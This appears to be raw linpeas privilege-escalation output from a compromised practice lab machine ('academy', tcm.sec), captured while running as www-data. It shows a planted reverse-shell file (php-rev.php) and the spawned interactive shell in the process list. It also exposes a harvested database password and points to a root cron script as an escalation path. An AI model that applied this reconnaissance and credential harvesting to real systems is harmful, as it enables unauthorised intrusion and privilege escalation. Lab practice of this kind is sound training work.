/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables 